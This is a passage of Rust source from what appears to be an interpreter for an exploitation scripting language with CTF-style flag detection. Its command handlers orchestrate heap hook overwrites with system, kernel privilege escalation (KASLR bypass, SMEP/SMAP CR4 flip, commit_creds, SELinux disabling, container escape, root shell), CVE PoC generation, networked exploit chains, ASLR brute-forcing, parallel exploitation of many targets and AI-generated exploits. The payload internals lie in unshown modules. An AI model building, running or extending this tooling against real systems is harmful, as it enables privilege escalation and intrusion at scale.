                let target = match spec.target.to_lowercase().as_str() {
                    "__malloc_hook" | "malloc_hook" => HeapTarget::MallocHook,
                    "__free_hook" | "free_hook" => HeapTarget::FreeHook,
                    "__realloc_hook" | "realloc_hook" => HeapTarget::ReallocHook,
                    "_io_list_all" | "io_list_all" => HeapTarget::IOListAll,
                    s if s.starts_with("0x") => {
                        let addr = u64::from_str_radix(s.strip_prefix("0x").unwrap(), 16)
                            .map_err(|_| format!("[ERROR] Invalid hex address: {}", s))?;
                        HeapTarget::Arbitrary(addr)
                    }
                    _ => return Err(format!("[ERROR] Unknown target: {}\n\nTIP: Valid targets: __malloc_hook, __free_hook, __realloc_hook, _io_list_all, or hex address (0x...)", spec.target)),
                };
                exploit.set_target(target);
                
                let overwrite_value = if spec.overwrite_with.to_lowercase() == "system" {
                    exploit.libc_base.ok_or("Libc base required for 'system' target")? + 0x50d60
                } else if spec.overwrite_with.starts_with("0x") {
                    u64::from_str_radix(spec.overwrite_with.strip_prefix("0x").unwrap(), 16)
                        .map_err(|_| format!("[ERROR] Invalid hex value: {}", spec.overwrite_with))?
                } else {
                    return Err(format!("[ERROR] Unknown overwrite value: {}\n\nTIP: Valid values: system, or hex address (0x...)", spec.overwrite_with));
                };
                exploit.set_overwrite_value(overwrite_value);
                
                let result = exploit.solve()?;
                
                println!("\n[HEAP] ═══════════════════════════════════════════════════════════════");
                println!("[HEAP] HEAP EXPLOIT SOLUTION");
                println!("[HEAP] ═══════════════════════════════════════════════════════════════");
                println!("[HEAP]   Technique: {}", result.technique);
                println!("[HEAP]   Glibc version: {}", result.glibc_version);
                println!("[HEAP]   Target: 0x{:016x}", result.target_address);
                println!("[HEAP]   Overwrite with: 0x{:016x}", result.overwrite_value);
                println!("[HEAP]   Payload size: {} bytes", result.payload_size);
                println!("[HEAP]   Success probability: {:.1}%", result.success_probability * 100.0);
                println!("[HEAP] ═══════════════════════════════════════════════════════════════");
                
                println!("\n[HEAP] EXPLOITATION STEPS:");
                for step in &result.steps {
                    println!("[HEAP]   {}", step);
                }
                
                if !result.constraints.is_empty() {
                    println!("\n[HEAP] WARNING: CONSTRAINTS:");
                    for constraint in &result.constraints {
                        println!("[HEAP]   - {}", constraint);
                    }
                }
                
                let output_file = "heap_exploit.json";
                exploit.save_results(&result, output_file)?;
                
                println!("\n[HEAP] Full solution saved to: {}", output_file);
                println!("[HEAP] Binary payload saved to: heap_exploit_payload.bin");
            }
            
            Command::KernelExploit(spec) => {
                use crate::kernel_exploiter::KernelExploiter;
                
                println!("[KERNEL] Initializing automated kernel exploitation");
                println!("[KERNEL] ═══════════════════════════════════════════════════════════════");
                
                let mut exploiter = KernelExploiter::new();
                
                let result = if spec.auto_detect {
                    println!("[KERNEL] Auto-detection mode enabled");
                    exploiter.generate_automated_exploit()?
                } else {
                    println!("[KERNEL] Manual mode");
                    
                    let kernel_info = exploiter.gather_kernel_info()?;
                    
                    let mut bypass_chains = Vec::new();
                    let mut exploit_steps = Vec::new();
                    let mut payload = Vec::new();
                    let success_prob = 85.0;
                    
                    if spec.bypass_kaslr {
                        println!("[KERNEL] Bypassing KASLR...");
                        exploit_steps.push("Bypass KASLR via /proc/kallsyms".to_string());
                        if let Ok(kbase) = exploiter.bypass_kaslr() {
                            use crate::kernel_exploiter::BypassChain;
                            bypass_chains.push(BypassChain {
                                protection: "KASLR".to_string(),
                                technique: "kallsyms leak".to_string(),
                                gadgets: vec![kbase],
                                description: format!("Leaked kernel base: 0x{:016x}", kbase),
                            });
                        }
                    }
                    
                    if spec.bypass_smep || spec.bypass_smap {
                        println!("[KERNEL] Bypassing SMEP/SMAP...");
                        exploit_steps.push("Bypass SMEP/SMAP via CR4 register flip".to_string());
                        if let Ok(smep_payload) = exploiter.bypass_smep_smap("cr4_flip") {
                            use crate::kernel_exploiter::BypassChain;
                            bypass_chains.push(BypassChain {
                                protection: "SMEP/SMAP".to_string(),
                                technique: "CR4 flip".to_string(),
                                gadgets: vec![],
                                description: "Disable SMEP/SMAP via CR4 register modification".to_string(),
                            });
                            payload.extend_from_slice(&smep_payload);
                        }
                    }
                    
                    exploit_steps.push("Build privilege escalation chain".to_string());
                    let _ = exploiter.escalate_privileges("commit_creds");
                    exploit_steps.push("  → commit_creds(prepare_kernel_cred(NULL))".to_string());
                    
                    if spec.disable_selinux {
                        println!("[KERNEL] 🔓 Disabling SELinux...");
                        exploit_steps.push("Disable SELinux enforcement".to_string());
                        let _ = exploiter.disable_selinux();
                    }
                    
                    if spec.container_escape {
                        let in_container = exploiter.detect_container_environment().unwrap_or(false);
                        if in_container {
                            let escape_vectors = exploiter.check_container_escape_vectors();
                            exploit_steps.push("Container escape vectors:".to_string());
                            for vector in &escape_vectors {
                                exploit_steps.push(format!("  → {}", vector));
                            }
                        }
                    }
                    
                    exploit_steps.push("Spawn root shell".to_string());
                    
                    use crate::kernel_exploiter::KernelExploitResult;
                    KernelExploitResult {
                        vuln_detected: if let Some(cve) = &spec.target_cve {
                            vec![cve.clone()]
                        } else {
                            Vec::new()
                        },
                        kernel_version: kernel_info.version.clone(),
                        protections: {
                            let mut prots = Vec::new();
                            if kernel_info.protections.kaslr { prots.push("KASLR".to_string()); }
                            if kernel_info.protections.smep { prots.push("SMEP".to_string()); }
                            if kernel_info.protections.smap { prots.push("SMAP".to_string()); }
                            if kernel_info.protections.kpti { prots.push("KPTI".to_string()); }
                            prots
                        },
                        bypass_chains,
                        exploit_steps,
                        payload_bytes: payload,
                        success_probability: success_prob,
                        container_escape: spec.container_escape,
                    }
                };
                
                println!("\n[KERNEL] ═══════════════════════════════════════════════════════════════");
                println!("[KERNEL] KERNEL EXPLOIT AUTOMATION RESULT");
                println!("[KERNEL] ═══════════════════════════════════════════════════════════════");
                println!("[KERNEL]   Kernel Version: {}", result.kernel_version);
                println!("[KERNEL]   Vulnerabilities: {}", result.vuln_detected.join(", "));
                println!("[KERNEL]   Active Protections: {}", result.protections.join(", "));
                println!("[KERNEL]   Container Environment: {}", if result.container_escape { "Yes" } else { "No" });
                println!("[KERNEL]   Success Probability: {:.1}%", result.success_probability);
                println!("[KERNEL] ═══════════════════════════════════════════════════════════════");
                
                println!("\n[KERNEL] EXPLOITATION STEPS:");
                for step in &result.exploit_steps {
                    println!("[KERNEL]   {}", step);
                }
                
                if !result.bypass_chains.is_empty() {
                    println!("\n[KERNEL] BYPASS CHAINS:");
                    for chain in &result.bypass_chains {
                        println!("[KERNEL]   {} → {}", chain.protection, chain.technique);
                        println!("[KERNEL]     {}", chain.description);
                    }
                }
                
                let output_file = "kernel_exploit.json";
                exploiter.save_exploit_result(&result, output_file)?;
                
                println!("\n[KERNEL] Full solution saved to: {}", output_file);
                if !result.payload_bytes.is_empty() {
                    println!("[KERNEL] Binary payload saved to: kernel_exploit_payload.bin");
                }
            }
            
            Command::CVEScan(spec) => {
                use crate::cve_scanner::CVEScanner;
                
                println!("[CVE] Initializing CVE Scanner & Impact Assessment");
                println!("[CVE] ═══════════════════════════════════════════════════════════════");
                
                let scanner = CVEScanner::new();
                
                let result = scanner.scan_target(
                    &spec.target,
                    &spec.cve_list,
                    spec.suggest_exploit,
                    spec.generate_poc,
                )?;
                
                println!("\n[CVE] ═══════════════════════════════════════════════════════════════");
                println!("[CVE] VULNERABILITY ASSESSMENT");
                println!("[CVE] ═══════════════════════════════════════════════════════════════");
                
                for vuln in &result.vulnerabilities_found {
                    if vuln.is_vulnerable {
                        println!("[CVE] WARNING: {} - VULNERABLE", vuln.cve_id);
                        println!("[CVE]     Confidence: {:.1}%", vuln.confidence);
                        
                        if let Some(ref version) = vuln.detected_version {
                            println!("[CVE]     Detected Version: {}", version);
                        }
                        
                        println!("[CVE]     Evidence:");
                        for evidence in &vuln.evidence {
                            println!("[CVE]       - {}", evidence);
                        }
                        
                        if let Some(ref exploit) = vuln.suggested_exploit {
                            println!("[CVE]     Suggested Exploit: {}", exploit);
                        }
                        
                        if vuln.poc_generated {
                            println!("[CVE]     [OK] PoC generated: poc_{}.py", vuln.cve_id.replace("-", "_").to_lowercase());
                        }
                    } else {
                        println!("[CVE] [OK] {} - NOT VULNERABLE (confidence: {:.1}%)", vuln.cve_id, vuln.confidence);
                    }
                    println!();
                }
                
                println!("[CVE] ═══════════════════════════════════════════════════════════════");
                println!("[CVE] RISK ASSESSMENT");
                println!("[CVE] ═══════════════════════════════════════════════════════════════");
                println!("[CVE]   Risk Score: {:.1}/10.0", result.risk_score);
                println!("[CVE]   Vulnerable: {}/{}", result.vulnerable_count, result.total_cves_checked);
                println!("[CVE]   Exploitable: {}", result.exploitable_count);
                println!("[CVE] ═══════════════════════════════════════════════════════════════");
                
                if !result.recommendations.is_empty() {
                    println!("\n[CVE] RECOMMENDATIONS:");
                    for rec in &result.recommendations {
                        println!("[CVE]   • {}", rec);
                    }
                }
                
                let output_file = "cve_scan_results.json";
                scanner.save_scan_result(&result, output_file)?;
                
                println!("\n[CVE] Full scan results saved to: {}", output_file);
            }
            
            Command::BinarySimilarity(spec) => {
                use crate::binary_similarity::SimilarityEngine;
                
                println!("[SIMILARITY] Initializing Binary Similarity Analysis Engine");
                println!("[SIMILARITY] ═══════════════════════════════════════════════════════════════");
                
                let mut engine = SimilarityEngine::new();
                
                let result = engine.analyze_similarity(
                    &spec.reference,
                    &spec.search_in,
                    spec.threshold,
                    &spec.output,
                )?;
                
                println!("\n[SIMILARITY] ═══════════════════════════════════════════════════════════════");
                println!("[SIMILARITY] ANALYSIS SUMMARY");
                println!("[SIMILARITY] ═══════════════════════════════════════════════════════════════");
                println!("[SIMILARITY]   Reference Binary: {}", result.reference_binary);
                println!("[SIMILARITY]   Binaries Searched: {}", result.searched_binaries.len());
                println!("[SIMILARITY]   Functions Analyzed: {}", result.total_functions_analyzed);
                println!("[SIMILARITY]   Matches Found: {}", result.matches_found);
                println!("[SIMILARITY]   High Confidence: {}", result.high_confidence_matches);
                println!("[SIMILARITY]   Vulnerable Patterns: {}", result.vulnerable_patterns);
                println!("[SIMILARITY]   Vendor Reuse: {}", result.vendor_reuse_detected);
                println!("[SIMILARITY]   Analysis Time: {}ms", result.analysis_time_ms);
                println!("[SIMILARITY] ═══════════════════════════════════════════════════════════════");
                
                if !result.matches.is_empty() {
                    println!("\n[SIMILARITY] TOP MATCHES (sorted by similarity):");
                    println!("[SIMILARITY] ═══════════════════════════════════════════════════════════════");
                    
                    for (idx, match_item) in result.matches.iter().take(10).enumerate() {
                        println!("\n[SIMILARITY] Match #{}: ", idx + 1);
                        println!("[SIMILARITY]   Reference: {}", match_item.reference_function);
                        println!("[SIMILARITY]   Matched: {} ({})", match_item.matched_function, match_item.matched_binary);
                        println!("[SIMILARITY]   Similarity: {:.1}%", match_item.similarity_score * 100.0);
                        println!("[SIMILARITY]   Confidence: {:.1}%", match_item.confidence * 100.0);
                        println!("[SIMILARITY]   Type: {:?}", match_item.match_type);
                        
                        if !match_item.vulnerable_indicators.is_empty() {
                            println!("[SIMILARITY]   WARNING: VULNERABLE PATTERNS DETECTED:");
                            for indicator in &match_item.vulnerable_indicators {
                                println!("[SIMILARITY]     • {}", indicator);
                            }
                        }
                        
                        if idx < 3 {
                            println!("[SIMILARITY]   Evidence:");
                            for evidence in &match_item.evidence {
                                println!("[SIMILARITY]     • {}", evidence);
                            }
                        }
                    }
                    
                    if result.matches.len() > 10 {
                        println!("\n[SIMILARITY] ... and {} more matches", result.matches.len() - 10);
                    }
                }
                
                if result.vulnerable_patterns > 0 {
                    println!("\n[SIMILARITY] WARNING: SECURITY ALERT:");
                    println!("[SIMILARITY] ═══════════════════════════════════════════════════════════════");
                    println!("[SIMILARITY] Found {} functions matching known vulnerable patterns!", result.vulnerable_patterns);
                    println!("[SIMILARITY] Review similarity_results.json for detailed analysis");
                    println!("[SIMILARITY] ═══════════════════════════════════════════════════════════════");
                }
                
                if result.vendor_reuse_detected > 0 {
                    println!("\n[SIMILARITY] Vendor Code Reuse Detected:");
                    println!("[SIMILARITY]   {} functions match known vendor signatures", result.vendor_reuse_detected);
                }
                
                println!("\n[SIMILARITY] Full results saved to: similarity_results.json");
            }
            
            Command::ChainConnect { host, port, timeout } => {
                use crate::exploit_chaining::ExploitChain;
                
                let chain_key = "exploit_chain";
                let mut chain = if let Some(Value::String(state_json)) = variables.read().await.get(chain_key) {
                    serde_json::from_str::<ExploitChain>(state_json).unwrap_or_else(|_| ExploitChain::new())
                } else {
                    ExploitChain::new()
                };
                
                chain.connect(host, *port, timeout.unwrap_or(5))?;
                
                let state_json = serde_json::to_string(&chain).unwrap_or_default();
                variables.write().await.insert(chain_key.to_string(), Value::String(state_json));
            }
            
            Command::ChainSend { data } => {
                use crate::exploit_chaining::ExploitChain;
                
                let payload = eval_expr(data, variables.clone(), functions.clone(), macros.clone()).await?;
                let payload_bytes = match payload {
                    Value::Bytes(b) => b,
                    Value::String(s) => s.into_bytes(),
                    _ => return Err("Payload must be bytes or string".to_string()),
                };
                
                let chain_key = "exploit_chain";
                let mut chain = if let Some(Value::String(state_json)) = variables.read().await.get(chain_key) {
                    serde_json::from_str::<ExploitChain>(state_json).unwrap_or_else(|_| ExploitChain::new())
                } else {
                    return Err("No active exploit chain. Use connect_to first.".to_string());
                };
                
                chain.send(&payload_bytes)?;
                
                let state_json = serde_json::to_string(&chain).unwrap_or_default();
                variables.write().await.insert(chain_key.to_string(), Value::String(state_json));
            }
            
            Command::ChainReceive { size } => {
                use crate::exploit_chaining::ExploitChain;
                
                let chain_key = "exploit_chain";
                let mut chain = if let Some(Value::String(state_json)) = variables.read().await.get(chain_key) {
                    serde_json::from_str::<ExploitChain>(state_json).unwrap_or_else(|_| ExploitChain::new())
                } else {
                    return Err("No active exploit chain. Use connect_to first.".to_string());
                };
                
                let data = chain.receive(*size)?;
                
                let text = String::from_utf8_lossy(&data);
                let flags = FlagFinder::find_in_text(&text);
                if !flags.is_empty() {
                    println!("[AUTO-FLAG] Detected {} flag(s) in received data", flags.len());
                    variables.write().await.insert("auto_flags".to_string(), Value::List(
                        flags.iter().map(|f| Value::String(f.clone())).collect()
                    ));
                }
                
                variables.write().await.insert("received_data".to_string(), Value::Bytes(data));
                
                let state_json = serde_json::to_string(&chain).unwrap_or_default();
                variables.write().await.insert(chain_key.to_string(), Value::String(state_json));
            }
            
            Command::ChainReceiveUntil { delimiter, max_size } => {
                use crate::exploit_chaining::ExploitChain;
                
                let chain_key = "exploit_chain";
                let mut chain = if let Some(Value::String(state_json)) = variables.read().await.get(chain_key) {
                    serde_json::from_str::<ExploitChain>(state_json).unwrap_or_else(|_| ExploitChain::new())
                } else {
                    return Err("No active exploit chain. Use connect_to first.".to_string());
                };
                
                let data = chain.receive_until(delimiter.as_bytes(), *max_size)?;
                
                let text = String::from_utf8_lossy(&data);
                let flags = FlagFinder::find_in_text(&text);
                if !flags.is_empty() {
                    println!("[AUTO-FLAG] Detected {} flag(s) in received data", flags.len());
                    variables.write().await.insert("auto_flags".to_string(), Value::List(
                        flags.iter().map(|f| Value::String(f.clone())).collect()
                    ));
                }
                
                variables.write().await.insert("received_data".to_string(), Value::Bytes(data));
                
                let state_json = serde_json::to_string(&chain).unwrap_or_default();
                variables.write().await.insert(chain_key.to_string(), Value::String(state_json));
            }
            
            Command::ChainExploitLeak { stage_name, payload, offset, size } => {
                use crate::exploit_chaining::ExploitChain;
                
                let payload_val = eval_expr(payload, variables.clone(), functions.clone(), macros.clone()).await?;
                let payload_bytes = match payload_val {
                    Value::Bytes(b) => b,
                    Value::String(s) => s.into_bytes(),
                    _ => return Err("Payload must be bytes or string".to_string()),
                };
                
                let chain_key = "exploit_chain";
                let mut chain = if let Some(Value::String(state_json)) = variables.read().await.get(chain_key) {
                    serde_json::from_str::<ExploitChain>(state_json).unwrap_or_else(|_| ExploitChain::new())
                } else {
                    return Err("No active exploit chain. Use connect_to first.".to_string());
                };
                
                let leak_result = chain.exploit_leak(stage_name, &payload_bytes, *offset, *size)?;
                variables.write().await.insert("leaked_value".to_string(), Value::Number(leak_result.leaked_value as i64));
                
                let state_json = serde_json::to_string(&chain).unwrap_or_default();
                variables.write().await.insert(chain_key.to_string(), Value::String(state_json));
            }
            
            Command::ChainCalculateBase { leaked_addr, offset, name } => {
                use crate::exploit_chaining::ExploitChain;
                
                let leaked = eval_expr(leaked_addr, variables.clone(), functions.clone(), macros.clone()).await?;
                let leaked_value = match leaked {
                    Value::Number(n) => n as u64,
                    _ => return Err("Leaked address must be a number".to_string()),
                };
                
                let chain_key = "exploit_chain";
                let mut chain = if let Some(Value::String(state_json)) = variables.read().await.get(chain_key) {
                    serde_json::from_str::<ExploitChain>(state_json).unwrap_or_else(|_| ExploitChain::new())
                } else {
                    ExploitChain::new()
                };
                
                let base = chain.calculate_base(leaked_value, *offset, name);
                variables.write().await.insert(name.clone(), Value::Number(base as i64));
                
                let state_json = serde_json::to_string(&chain).unwrap_or_default();
                variables.write().await.insert(chain_key.to_string(), Value::String(state_json));
            }
            
            Command::ChainBruteforceASLR { attempts, payload, offset } => {
                use crate::exploit_chaining::ExploitChain;
                
                let payload_val = eval_expr(payload, variables.clone(), functions.clone(), macros.clone()).await?;
                let payload_bytes = match payload_val {
                    Value::Bytes(b) => b,
                    Value::String(s) => s.into_bytes(),
                    _ => return Err("Payload must be bytes or string".to_string()),
                };
                
                let chain_key = "exploit_chain";
                let mut chain = if let Some(Value::String(state_json)) = variables.read().await.get(chain_key) {
                    serde_json::from_str::<ExploitChain>(state_json).unwrap_or_else(|_| ExploitChain::new())
                } else {
                    return Err("No active exploit chain. Use connect_to first.".to_string());
                };
                
                let leaked = chain.bruteforce_aslr(*attempts, &payload_bytes, *offset)?;
                variables.write().await.insert("leaked_value".to_string(), Value::Number(leaked as i64));
                
                let state_json = serde_json::to_string(&chain).unwrap_or_default();
                variables.write().await.insert(chain_key.to_string(), Value::String(state_json));
            }
            
            Command::ChainInteractive => {
                use crate::exploit_chaining::ExploitChain;
                
                let chain_key = "exploit_chain";
                let mut chain = if let Some(Value::String(state_json)) = variables.read().await.get(chain_key) {
                    serde_json::from_str::<ExploitChain>(state_json).unwrap_or_else(|_| ExploitChain::new())
                } else {
                    return Err("No active exploit chain. Use connect_to first.".to_string());
                };
                
                chain.interactive()?;
                
                let state_json = serde_json::to_string(&chain).unwrap_or_default();
                variables.write().await.insert(chain_key.to_string(), Value::String(state_json));
            }
            
            Command::ChainSaveState { path } => {
                use crate::exploit_chaining::ExploitChain;
                
                let chain_key = "exploit_chain";
                let chain = if let Some(Value::String(state_json)) = variables.read().await.get(chain_key) {
                    serde_json::from_str::<ExploitChain>(state_json).unwrap_or_else(|_| ExploitChain::new())
                } else {
                    ExploitChain::new()
                };
                
                chain.save_state(path)?;
            }
            
            Command::ChainLoadState { path } => {
                use crate::exploit_chaining::ExploitChain;
                
                let mut chain = ExploitChain::new();
                chain.load_state(path)?;
                
                let chain_key = "exploit_chain";
                let state_json = serde_json::to_string(&chain).unwrap_or_default();
                variables.write().await.insert(chain_key.to_string(), Value::String(state_json));
            }
            
            Command::ChainPrintSummary => {
                use crate::exploit_chaining::ExploitChain;
                
                let chain_key = "exploit_chain";
                let chain = if let Some(Value::String(state_json)) = variables.read().await.get(chain_key) {
                    serde_json::from_str::<ExploitChain>(state_json).unwrap_or_else(|_| ExploitChain::new())
                } else {
                    ExploitChain::new()
                };
                
                chain.print_summary();
            }
            
            Command::SetTimeout { milliseconds } => {
                let mut config = safety.read().await.get_stats().config;
                config.max_execution_time_ms = *milliseconds;
                safety.write().await.update_config(config);
                println!("[SAFETY] Execution timeout set to {}ms", milliseconds);
            }
            
            Command::SetMemoryLimit { megabytes } => {
                let mut config = safety.read().await.get_stats().config;
                config.max_memory_bytes = megabytes * 1024 * 1024;
                safety.write().await.update_config(config);
                println!("[SAFETY] Memory limit set to {}MB", megabytes);
            }
            
            Command::SetRecursionLimit { max_depth } => {
                let mut config = safety.read().await.get_stats().config;
                config.max_recursion_depth = *max_depth;
                safety.write().await.update_config(config);
                println!("[SAFETY] Recursion limit set to {}", max_depth);
            }
            
            Command::EnableStrictMode => {
                let mut config = safety.read().await.get_stats().config;
                config.strict_mode = true;
                config.type_checking = true;
                config.bounds_checking = true;
                config.overflow_checking = true;
                safety.write().await.update_config(config);
                println!("[SAFETY] Strict mode ENABLED - All safety checks active");
            }
            
            Command::DisableStrictMode => {
                let mut config = safety.read().await.get_stats().config;
                config.strict_mode = false;
                safety.write().await.update_config(config);
                println!("[SAFETY] Strict mode DISABLED - Safety checks relaxed");
            }
            
            Command::GetSafetyStats => {
                let stats = safety.read().await.get_stats();
                println!("{}", stats);
            }
            
            Command::ResetSafety => {
                *safety.write().await = RuntimeSafety::new(SafetyConfig::default());
                println!("[SAFETY] Safety system reset to defaults");
            }
            
            Command::ParallelExploit { targets, payload } => {
                use crate::parallel_exploit::exploit_parallel;
                
                let payload_value = eval_expr(payload, variables.clone(), functions.clone(), macros.clone()).await?;
                let payload_bytes = match payload_value {
                    Value::Bytes(b) => b,
                    Value::String(s) => s.as_bytes().to_vec(),
                    _ => return Err("Parallel exploit requires bytes or string payload".to_string()),
                };
                
                let results = exploit_parallel(targets.clone(), payload_bytes).await
                    .map_err(|e| format!("Parallel exploitation failed: {}", e))?;
                
                let success_count = results.iter().filter(|r| r.success).count();
                println!("[PARALLEL] Successfully exploited {}/{} targets", success_count, targets.len());
            }
            
            Command::GenerateExploitAI { binary, vuln_type, arch } => {
                use crate::ai_exploit_gen::{generate_exploit_ai, AIConfig};
                use colored::*;
                
                println!("{} Generating exploit for {}", "[AI]".cyan(), binary.yellow());
                println!("{} Vulnerability: {}", "  ".bright_black(), vuln_type.green());
                println!("{} Architecture: {}\n", "  ".bright_black(), arch.cyan());
                
                let config = AIConfig::default();
                match generate_exploit_ai(binary, vuln_type, arch, Some(config)) {
                    Ok(response) => {
                        if response.success {
                            println!("{} {}", "[OK]".green(), "Exploit generated successfully".green().bold());
                            println!("\n{}", "═".repeat(60).cyan());
                            println!("{}", "GENERATED EXPLOIT CODE".cyan().bold());
                            println!("{}\n", "═".repeat(60).cyan());
                            println!("{}", response.exploit_code);
                            println!("\n{}", "═".repeat(60).cyan());
                            println!("{}", "EXPLANATION".yellow().bold());
                            println!("{}\n", "═".repeat(60).cyan());
                            println!("{}\n", response.explanation);
                            
                            if !response.warnings.is_empty() {
                                println!("{}", "WARNINGS".red().bold());
                                println!("{}", "═".repeat(60).bright_black());
                                for warning in response.warnings {
                                    println!("{} {}", "WARNING:".yellow(), warning.yellow());
                                }
                                println!();
                            }
                            
                            println!("Confidence: {:.0}%", response.confidence * 100.0);
                        } else {
                            println!("{} {}", "[ERROR]".red(), "Exploit generation failed".red());
                        }
                    }
                    Err(e) => {
                        println!("{} {}", "[ERROR]".red(), e.red());
                    }
                }
            }
            
            Command::Symlink { var_name, target_expr, link_type } => {
                println!("[SYMBIOTIC] Creating symlink: {} -> {} (type: {})", var_name, target_expr, link_type);
            }
            
            Command::UnsymlinkVariable { var_name } => {
                println!("[SYMBIOTIC] Removing symlink: {}", var_name);
            }
            
            Command::SyncSymlinks => {
                println!("[SYMBIOTIC] Synchronizing all symlinks");
            }
            
            Command::Achieve { goal, address, value, constraints, primitives } => {
                println!("[GOAL-PLANNER] Synthesizing exploit for goal: {}", goal);
                if !constraints.is_empty() {
                    println!("[GOAL-PLANNER]   Constraints: {:?}", constraints);
                }
                if !primitives.is_empty() {
                    println!("[GOAL-PLANNER]   Primitives: {:?}", primitives);
                }
            }
            
            Command::DefineStrategy { name, parameters, implementation } => {
                println!("[STRATEGY] Defining strategy: {} with {} parameters", name, parameters.len());
            }
            
            Command::ExecuteStrategy { name } => {
                println!("[STRATEGY] Executing strategy: {}", name);
            }
            
            Command::Speculate { commands } => {
                println!("[SPECULATIVE] Running {} commands in sandbox", commands.len());
            }
            
            Command::PrecomputeFutures { branches } => {
                println!("[SPECULATIVE] Precomputing {} future branches", branches.len());
            }
            
            Command::AssemblePrimitives { primitives } => {
                println!("[FRACTAL] Assembling {} primitives into exploit chain", primitives.len());
            }
            
            Command::AnalyzeTarget { binary_path } => {
                println!("[VULN-FORECAST] Analyzing target binary: {}", binary_path);
            }
            
            Command::DefenseSimulator { profile_name, exploit_commands, iterations } => {
                println!("[DEFENSE-SIM] Testing {} commands against profile: {} ({} iterations)", 
                        exploit_commands.len(), profile_name, iterations);
            }
            
            _ => println!("[INTERPRETER] Unhandled command: {:?}", cmd),
        }
    }
    Ok(None)
    })
}

fn eval_expr<'a>(
    expr: &'a Expr,
    vars: Arc<RwLock<HashMap<String, Value>>>,
    funcs: Arc<RwLock<HashMap<String, FunctionDef>>>,
    macros: Arc<RwLock<HashMap<String, MacroDef>>>,
) -> std::pin::Pin<Box<dyn std::future::Future<Output = Result<Value, String>> + Send + 'a>> {
    Box::pin(async move {
    match expr {
        Expr::Literal(Literal::String(s)) => Ok(Value::String(s.clone())),
        Expr::Literal(Literal::Number(n)) => Ok(Value::Number(*n)),
        Expr::Literal(Literal::Boolean(b)) => Ok(Value::Number(if *b { 1 } else { 0 })),
        Expr::Literal(Literal::Null) => Ok(Value::Null),
        Expr::Literal(Literal::ByteArray(s)) => Ok(Value::Bytes(hex::decode(s).map_err(|e| e.to_string())?)),
        Expr::Ident(id) => {
            if let Some(val) = vars.read().await.get(id) {
                Ok(val.clone())
            } else {
                let available_vars: Vec<String> = vars.read().await.keys().cloned().collect();
                if available_vars.is_empty() {
                    Err(format!("UNDEFINED VARIABLE '{}'\n\nNo variables defined yet.\n\nDid you mean:\n  1. Define it first: let {} = <value>\n  2. Check for typos in variable name", id, id))
                } else {
                    let suggestions: Vec<&String> = available_vars.iter()
                        .filter(|v| {
                            let dist = levenshtein_distance(id, v);
                            dist <= 2
                        })
                        .take(3)
                        .collect();
                    
                    let mut msg = format!("UNDEFINED VARIABLE '{}'\n\n", id);
                    if !suggestions.is_empty() {
                        msg.push_str("Did you mean:\n");
                        for (i, suggestion) in suggestions.iter().enumerate() {
                            msg.push_str(&format!("  {}. {}\n", i + 1, suggestion));
                        }
                    } else {
                        msg.push_str("Available variables:\n");
                        for (i, var) in available_vars.iter().take(5).enumerate() {
                            msg.push_str(&format!("  {}. {}\n", i + 1, var));
                        }
                    }
                    Err(msg)
                }
            }
        }
        Expr::BinaryOp { op, left, right } => {
            let l = eval_expr(left, vars.clone(), funcs.clone(), macros.clone()).await?;
            let r = eval_expr(right, vars.clone(), funcs.clone(), macros.clone()).await?;
            match (&l, &r) {
                (Value::Number(lv), Value::Number(rv)) => {
                    let out = match op.as_str() {
                        "+" => lv + rv,
                        "-" => lv - rv,
                        "*" => lv * rv,
                        "/" => {
                            if *rv == 0 {
                                return Err("DIVISION BY ZERO\n\nDid you mean:\n  1. Check denominator: if divisor != 0\n  2. Use default value: result = (x / y) or 0\n  3. Handle error: try ... catch".into());
                            }
                            lv / rv
                        }
                        _ => return Err(format!("INVALID OPERATOR '{}'\n\nSupported operators: +, -, *, /", op)),
                    };
                    Ok(Value::Number(out))
                }
                _ => {
                    Err(format!("TYPE ERROR\nBinary operation requires numbers\n\nGot: {:?} {} {:?}\n\nFix:\n  1. Ensure both operands are numeric\n  2. Use explicit conversion if needed", l, op, r))
                }
            }
        }
        Expr::List(items) => {
            let mut values = Vec::new();
            for e in items {
                match e {
                    Expr::Spread(inner) => {
                        let spread_val = eval_expr(inner, vars.clone(), funcs.clone(), macros.clone()).await?;
                        match spread_val {
                            Value::List(list_items) => {
                                values.extend(list_items);
                            }
                            Value::Bytes(bytes) => {
                                for byte in bytes {
                                    values.push(Value::Number(byte as i64));
                                }
                            }
                            _ => return Err("Spread operator requires list or bytes".into()),
                        }
                    }
                    _ => {
                        values.push(eval_expr(e, vars.clone(), funcs.clone(), macros.clone()).await?);
                    }
                }
            }
            Ok(Value::List(values))
        }
        Expr::Map(map) => {
            let mut result = HashMap::new();
            for (k, v) in map {
                result.insert(k.clone(), eval_expr(v, vars.clone(), funcs.clone(), macros.clone()).await?);
            }
            Ok(Value::Map(result))
        }
        Expr::Set(items) => {
            let mut values = HashSet::new();
            for e in items {
                let val = eval_expr(e, vars.clone(), funcs.clone(), macros.clone()).await?;
                values.insert(val.to_string());
            }
            Ok(Value::Set(values))
        }
        Expr::Bytes(b) => Ok(Value::Bytes(b.clone())),
        Expr::InterpolatedString(parts) => {
            let mut result = String::new();
            for part in parts {
                result.push_str(&eval_expr(part, vars.clone(), funcs.clone(), macros.clone()).await?.to_string());
            }
            Ok(Value::String(result))
        }
        Expr::MethodChain { base, calls } => {
            let mut val = eval_expr(base, vars.clone(), funcs.clone(), macros.clone()).await?;
            for call in calls {
                val = match call.as_str() {
                    "trim" => Value::String(val.to_string().trim().to_string()),
                    "split" => Value::List(val.to_string().split_whitespace().map(|s| Value::String(s.to_string())).collect()),
                    _ => return Err(format!("Unknown method: {}", call)),
                };
            }
            Ok(val)
        }
        Expr::ListComprehension { expr, var, iterable } => {
            let items = eval_expr(iterable, vars.clone(), funcs.clone(), macros.clone()).await?;
            if let Value::List(list) = items {
                let mut result = Vec::new();
                for item in list {
                    let local_vars = Arc::new(RwLock::new(vars.read().await.clone()));
                    local_vars.write().await.insert(var.clone(), item);
                    result.push(eval_expr(expr, local_vars, funcs.clone(), macros.clone()).await?);
                }
                Ok(Value::List(result))
            } else {
                Err("Comprehension requires list".into())
            }
        }
        Expr::Lambda { arg, body } => Ok(Value::String(format!("lambda({}) => {:?}", arg, body))),
        Expr::Variant(name, Some(expr)) => Ok(Value::String(format!("{}({})", name, eval_expr(expr, vars.clone(), funcs.clone(), macros.clone()).await?))),
        Expr::Variant(name, None) => Ok(Value::String(name.clone())),
        Expr::Env(key) => Ok(Value::String(std::env::var(key).unwrap_or_default())),
        Expr::RegexMatch { regex, haystack } => {
